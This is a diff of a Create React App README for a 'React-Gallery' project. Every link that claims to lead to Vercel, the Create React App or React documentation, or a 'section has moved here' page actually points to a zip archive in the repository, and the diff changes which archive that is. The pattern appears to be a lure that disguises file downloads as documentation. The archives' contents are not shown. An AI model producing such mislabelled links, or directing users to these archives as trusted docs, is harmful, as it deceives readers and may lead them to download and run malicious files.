@@ -1,10 +1,10 @@
 # Preview this application
 
-This application is hosted on [Vercel](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip)
+This application is hosted on [Vercel](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip)
 
 # Getting Started with Create React App
 
-This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip).
+This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip).
 
 ## Available Scripts
 
@@ -21,7 +21,7 @@ You will also see any lint errors in the console.
 ### `npm test`
 
 Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip) for more information.
+See the section about [running tests](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip) for more information.
 
 ### `npm run build`
 
@@ -31,7 +31,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.\
 Your app is ready to be deployed!
 
-See the section about [deployment](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip) for more information.
+See the section about [deployment](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip) for more information.
 
 ### `npm run eject`
 
@@ -45,30 +45,30 @@ You don’t have to ever use `eject`. The curated feature set is suitable for sm
 
 ## Learn More
 
-You can learn more in the [Create React App documentation](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip).
+You can learn more in the [Create React App documentation](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip).
 
-To learn React, check out the [React documentation](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip).
+To learn React, check out the [React documentation](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip).
 
 ### Code Splitting
 
-This section has moved here: [https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip)
+This section has moved here: [https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip)
 
 ### Analyzing the Bundle Size
 
-This section has moved here: [https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip)
+This section has moved here: [https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip)
 
 ### Making a Progressive Web App
 
-This section has moved here: [https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip)
+This section has moved here: [https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip)
 
 ### Advanced Configuration
 
-This section has moved here: [https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip)
+This section has moved here: [https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip)
 
 ### Deployment
 
-This section has moved here: [https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip)
+This section has moved here: [https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip)
 
 ### `npm run build` fails to minify
 
-This section has moved here: [https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/components/Gallery-React-1.3.zip)
+This section has moved here: [https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip](https://raw.githubusercontent.com/weiran0630/React-Gallery/master/src/api/React-Gallery-3.1-alpha.2.zip)
